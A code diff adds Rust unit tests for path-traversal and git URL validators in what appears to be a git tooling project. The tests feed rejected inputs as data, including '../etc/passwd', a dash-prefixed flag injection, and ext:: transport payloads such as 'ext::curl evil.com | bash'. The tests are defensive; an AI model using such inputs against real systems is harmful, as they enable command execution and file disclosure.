@@ -61,6 +61,79 @@ pub fn validate_git_url(url: &str) -> Result<()> {
     Ok(())
 }
 
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_is_safe_relative_path_normal() {
+        assert!(is_safe_relative_path("src/main.rs"));
+        assert!(is_safe_relative_path("a/b/c.txt"));
+        assert!(is_safe_relative_path("file.rs"));
+        assert!(is_safe_relative_path("./foo.rs"));
+        assert!(is_safe_relative_path("a/./b/./c.rs"));
+    }
+
+    #[test]
+    fn test_is_safe_relative_path_traversal() {
+        assert!(!is_safe_relative_path("../etc/passwd"));
+        assert!(!is_safe_relative_path("foo/../../bar"));
+        assert!(!is_safe_relative_path("../../root"));
+        assert!(!is_safe_relative_path("/etc/passwd"));
+    }
+
+    #[test]
+    fn test_is_safe_relative_path_empty() {
+        assert!(!is_safe_relative_path(""));
+    }
+
+    #[test]
+    fn test_validate_git_url_valid() {
+        assert!(validate_git_url("https://github.com/user/repo.git").is_ok());
+        assert!(validate_git_url("http://example.com/repo").is_ok());
+        assert!(validate_git_url("git://example.com/repo").is_ok());
+        assert!(validate_git_url("ssh://git@github.com/user/repo.git").is_ok());
+        assert!(validate_git_url("file:///path/to/repo").is_ok());
+        assert!(validate_git_url("git@github.com:user/repo.git").is_ok());
+        assert!(validate_git_url("/absolute/path").is_ok());
+    }
+
+    #[test]
+    fn test_validate_git_url_empty() {
+        assert!(validate_git_url("").is_err());
+    }
+
+    #[test]
+    fn test_validate_git_url_dash_prefix() {
+        assert!(validate_git_url("-flagInjection").is_err());
+    }
+
+    #[test]
+    fn test_validate_git_url_control_chars() {
+        assert!(validate_git_url("https://x.com\0").is_err());
+        assert!(validate_git_url("https://x.com\nextra").is_err());
+        assert!(validate_git_url("https://x.com\r\nextra").is_err());
+    }
+
+    #[test]
+    fn test_validate_git_url_ext_transport_blocked() {
+        assert!(validate_git_url("ext::/bin/sh -c id").is_err());
+        assert!(validate_git_url("ext::curl evil.com | bash").is_err());
+    }
+
+    #[test]
+    fn test_validate_git_url_scp_style() {
+        assert!(validate_git_url("git@github.com:user/repo.git").is_ok());
+        assert!(validate_git_url("user@host:path/to/repo").is_ok());
+    }
+
+    #[test]
+    fn test_validate_git_url_invalid() {
+        assert!(validate_git_url("not-a-url").is_err());
+        assert!(validate_git_url("random string").is_err());
+    }
+}
+
 pub fn detect_lfs_available(repo_root: &Path) -> bool {
     Command::new("git")
         .args(["lfs", "version"])
